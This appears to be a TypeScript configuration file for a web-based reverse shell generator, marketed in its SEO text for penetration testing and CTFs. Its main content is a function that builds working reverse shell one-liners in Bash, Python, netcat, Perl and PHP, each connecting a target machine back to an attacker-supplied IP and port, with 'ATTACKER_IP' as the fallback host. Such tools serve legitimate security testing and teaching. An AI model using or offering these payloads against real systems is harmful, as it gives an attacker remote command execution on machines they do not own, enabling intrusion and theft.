import type { GeneratorConfig } from '../../types/generator';

export const reverseShellGenerator: GeneratorConfig = {
  id: 'reverse-shell',
  name: 'Reverse Shell',
  description: 'Generate one-liner reverse shells for various languages and tools.',
  categoryId: 'exploitation',
  exampleUsage: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1',
  explanation: 'A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which allows for command execution.',
  fields: [
    {
      id: 'ip',
      label: 'LHOST (Listener IP)',
      type: 'text',
      placeholder: 'e.g. 10.10.10.10',
      required: true,
      defaultValue: '',
      description: 'The IP address of your listener machine.'
    },
    {
      id: 'port',
      label: 'LPORT (Listener Port)',
      type: 'number',
      placeholder: 'e.g. 4444',
      required: true,
      defaultValue: 4444,
      description: 'The port your listener is waiting on.'
    },
    {
      id: 'shellType',
      label: 'Shell Type',
      type: 'select',
      options: [
        { label: 'Bash (-i)', value: 'bash' },
        { label: 'Python', value: 'python' },
        { label: 'Netcat (-e)', value: 'nc' },
        { label: 'Netcat (FIFO)', value: 'nc_fifo' },
        { label: 'Perl', value: 'perl' },
        { label: 'PHP', value: 'php' }
      ],
      defaultValue: 'bash'
    }
  ],
  generateCommand: (values: Record<string, string | boolean | number>) => {
    const ip = values.ip || 'ATTACKER_IP';
    const port = values.port || '4444';
    
    switch (values.shellType) {
      case 'bash':
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      case 'python':
        return `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
      case 'nc':
        return `nc -e /bin/bash ${ip} ${port}`;
      case 'nc_fifo':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
      case 'perl':
        return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
      case 'php':
        return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      default:
        return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    }
  },
  seo: {
    title: 'Reverse Shell Generator - One-Liner Payloads',
    description: 'Generate reverse shell one-liners for Bash, Python, Netcat, Perl, and PHP. Instant payloads for penetration testing and CTFs.',
    keywords: ['reverse shell generator', 'bash reverse shell', 'python reverse shell', 'nc reverse shell', 'pentest payloads', 'reverse shell cheat sheet']
  }
};
